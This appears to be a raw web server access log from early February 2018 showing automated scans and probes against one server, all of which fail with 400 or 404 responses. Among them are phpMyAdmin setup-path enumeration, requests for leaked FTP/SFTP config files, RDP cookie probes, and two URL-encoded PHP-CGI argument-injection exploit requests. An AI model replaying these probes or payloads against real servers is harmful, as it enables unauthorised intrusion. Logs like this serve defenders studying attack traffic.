117.50.7.159 - - [31/Jan/2018:09:26:30 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
106.75.85.117 - - [31/Jan/2018:09:26:31 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"
95.213.177.126 - - [31/Jan/2018:09:49:51 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
209.126.136.4 - - [31/Jan/2018:11:12:10 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
71.6.202.198 - - [31/Jan/2018:12:12:20 +0000] "GET /ccvv HTTP/1.1" 404 200 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)"
182.101.48.86 - - [31/Jan/2018:12:34:05 +0000] "GET /current_config/passwd HTTP/1.1" 404 169 "-" "-"
95.213.177.125 - - [31/Jan/2018:14:17:22 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
178.73.215.171 - - [31/Jan/2018:18:22:11 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
178.73.215.171 - - [31/Jan/2018:18:22:11 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
95.213.177.125 - - [31/Jan/2018:18:48:55 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
220.181.159.77 - - [31/Jan/2018:19:05:02 +0000] "\x16\x03\x01\x00\x8C\x01\x00\x00\x88\x03\x03~\x16\x1D2\x00\x8A\xF1\xD5\x81\xBCoJ4\xEDc\xAE\x16\xCE\x1C_\xC2\xE1)\x97\xB6\xFC\xF0\xE8\x85\xA0\xE5H\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 173 "-" "-"
220.181.159.77 - - [31/Jan/2018:19:05:03 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
124.116.157.198 - - [31/Jan/2018:23:16:04 +0000] "GET / HTTP/1.0" 200 264 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
95.213.177.124 - - [31/Jan/2018:23:21:14 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
38.142.99.26 - - [31/Jan/2018:23:27:30 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
178.73.215.171 - - [01/Feb/2018:00:26:52 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
178.73.215.171 - - [01/Feb/2018:00:26:52 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
66.111.41.235 - - [01/Feb/2018:01:51:17 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
95.213.177.124 - - [01/Feb/2018:03:50:59 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
60.191.38.78 - - [01/Feb/2018:04:59:07 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
66.111.41.235 - - [01/Feb/2018:05:09:16 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
18.144.6.58 - - [01/Feb/2018:05:47:49 +0000] "OPTIONS / HTTP/1.1" 405 575 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
66.118.142.140 - - [01/Feb/2018:05:50:43 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
191.96.249.136 - - [01/Feb/2018:06:09:39 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 169 "-" "-"
95.213.177.125 - - [01/Feb/2018:08:23:54 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
139.162.114.70 - - [01/Feb/2018:09:09:37 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
5.101.40.8 - - [01/Feb/2018:09:15:29 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 173 "-" "-"
66.111.41.235 - - [01/Feb/2018:09:40:49 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
124.40.250.58 - - [01/Feb/2018:11:34:05 +0000] "GET /CFIDE/administrator/ HTTP/1.1" 404 169 "-" "-"
178.73.215.171 - - [01/Feb/2018:12:34:10 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
178.73.215.171 - - [01/Feb/2018:12:34:10 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
95.213.177.123 - - [01/Feb/2018:12:50:28 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
172.104.108.109 - - [01/Feb/2018:13:00:42 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0"
66.111.41.235 - - [01/Feb/2018:16:22:23 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
183.203.31.98 - - [01/Feb/2018:16:36:08 +0000] "POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 404 169 "-" "-"
95.213.177.124 - - [01/Feb/2018:17:19:19 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
95.213.177.123 - - [01/Feb/2018:21:51:01 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
66.111.41.237 - - [01/Feb/2018:23:35:35 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
107.170.233.71 - - [01/Feb/2018:23:40:31 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 zgrab/0.x"
66.111.41.237 - - [02/Feb/2018:01:28:25 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
141.212.122.96 - - [02/Feb/2018:01:36:27 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 zgrab/0.x"
196.52.43.64 - - [02/Feb/2018:01:47:12 +0000] "GET / HTTP/1.0" 200 264 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
95.213.177.125 - - [02/Feb/2018:02:25:10 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
66.111.41.237 - - [02/Feb/2018:05:29:56 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
95.213.177.123 - - [02/Feb/2018:06:57:56 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
60.191.38.77 - - [02/Feb/2018:07:54:39 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
66.111.41.237 - - [02/Feb/2018:10:39:28 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
95.213.177.124 - - [02/Feb/2018:11:24:40 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
89.248.172.90 - - [02/Feb/2018:12:33:20 +0000] "GET http://httpheader.net/ HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
89.248.172.90 - - [02/Feb/2018:12:33:27 +0000] "\x04\x01\x00P\xA3\xAC\x07\xA20\x00" 400 173 "-" "-"
89.248.172.90 - - [02/Feb/2018:12:33:37 +0000] "\x04\x01\x00P\xA3\xAC\x07\xA20\x00" 400 173 "-" "-"
89.248.172.90 - - [02/Feb/2018:12:33:41 +0000] "\x05\x01\x00" 400 173 "-" "-"
210.209.72.124 - - [02/Feb/2018:13:14:51 +0000] "POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 404 169 "-" "-"
66.111.41.237 - - [02/Feb/2018:14:54:02 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
95.213.177.126 - - [02/Feb/2018:15:48:32 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
182.48.105.210 - - [02/Feb/2018:17:24:49 +0000] "GET / HTTP/1.0" 200 264 "http://35.196.196.232:80/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
38.142.98.186 - - [02/Feb/2018:17:29:37 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
95.213.177.125 - - [02/Feb/2018:20:16:37 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
60.191.38.78 - - [02/Feb/2018:21:16:50 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
107.170.232.10 - - [02/Feb/2018:23:00:59 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 zgrab/0.x"
95.213.177.123 - - [03/Feb/2018:00:41:22 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
95.213.184.180 - - [03/Feb/2018:00:46:12 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 173 "-" "-"
107.170.237.92 - - [03/Feb/2018:02:08:21 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 zgrab/0.x"
13.93.107.142 - - [03/Feb/2018:02:39:28 +0000] "CONNECT pl.metin2.gameforge.com:443 HTTP/1.0" 400 173 "-" "-"
94.102.49.4 - - [03/Feb/2018:02:52:50 +0000] "GET / HTTP/1.0" 200 264 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
95.213.177.125 - - [03/Feb/2018:05:09:39 +0000] "CONNECT check.proxyradar.com:80 HTTP/1.1" 400 173 "-" "-"
139.162.114.70 - - [03/Feb/2018:05:34:39 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
71.6.202.198 - - [03/Feb/2018:09:17:48 +0000] "GET /ccvv HTTP/1.1" 404 200 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64)"
164.132.91.1 - - [03/Feb/2018:09:30:01 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)"
195.22.127.249 - - [03/Feb/2018:10:33:40 +0000] "GET /.ftpconfig HTTP/1.1" 404 200 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
195.22.127.249 - - [03/Feb/2018:10:33:40 +0000] "GET /.remote-sync.json HTTP/1.1" 404 200 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
195.22.127.249 - - [03/Feb/2018:10:33:41 +0000] "GET /.vscode/ftp-sync.json HTTP/1.1" 404 200 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
195.22.127.249 - - [03/Feb/2018:10:33:41 +0000] "GET /sftp-config.json HTTP/1.1" 404 200 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
195.22.127.249 - - [03/Feb/2018:10:33:41 +0000] "GET /deployment-config.json HTTP/1.1" 404 200 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
63.246.129.99 - - [03/Feb/2018:14:15:30 +0000] "HEAD /phpmyadmin/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"
195.54.47.52 - - [03/Feb/2018:14:33:05 +0000] "GET /admindb/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:05 +0000] "GET /admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:05 +0000] "GET /admin/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:06 +0000] "GET /admin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:06 +0000] "GET /dbadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:06 +0000] "GET /db/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:06 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:07 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:07 +0000] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:07 +0000] "GET /mysql/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:07 +0000] "GET /phpmyadmin2/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:08 +0000] "GET /phpMyAdmin2/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:08 +0000] "GET /phpMyAdmin/scripts/setup0.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:08 +0000] "GET /phpmyadmin/scripts/setup1.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:08 +0000] "GET /phpMyAdmin/scripts/setup1.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:09 +0000] "GET /_phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:09 +0000] "GET /php-my-admin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:09 +0000] "GET /phpmyadmin_/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:09 +0000] "GET /phpmyadmin/scripts/_setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:10 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:10 +0000] "GET /phpmyadmin/scripts/Setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:10 +0000] "GET /_phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:10 +0000] "GET /phpMyAdmin_/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:11 +0000] "GET /phpMyAdmin/scripts/_setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:11 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:11 +0000] "GET /phpMyAdmin/scripts.setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:11 +0000] "GET /phpMyAdmin/scripts/Setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:12 +0000] "GET /PhpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:12 +0000] "GET /PHPMYADMIN/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:12 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:12 +0000] "GET /PMA/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:13 +0000] "GET /scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:14:33:13 +0000] "GET /sql/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
66.70.218.233 - - [03/Feb/2018:16:52:04 +0000] "GET /vendor/phpunit/phpunit/src/Util/Filter.php HTTP/1.1" 404 143 "-" "Go-http-client/1.1"
195.54.47.52 - - [03/Feb/2018:18:12:17 +0000] "GET /admindb/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:17 +0000] "GET /admindb/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /admin/phpmyadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /admin/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /admin/phpMyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /admin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /admin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /dbadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:18 +0000] "GET /dbadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /db/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /db/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
195.54.47.52 - - [03/Feb/2018:18:12:19 +0000] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
